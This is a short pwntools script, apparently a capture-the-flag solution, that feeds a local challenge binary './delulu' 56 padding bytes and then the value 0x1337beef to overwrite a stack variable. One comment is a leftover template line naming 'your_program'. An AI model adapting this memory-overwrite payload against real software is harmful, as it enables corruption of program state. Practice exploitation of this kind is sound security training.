from pwn import *

# Set up the connection
io = process('./delulu')  # Replace 'your_program' with the name of the binary

# Craft the payload
payload = b'A' * 56  # Fill up until local_48
payload += p64(0x1337beef)  # Overwrite local_48 with the desired value

# Send the payload
io.sendline(payload)

# Receive and print the output
print(io.recvall().decode())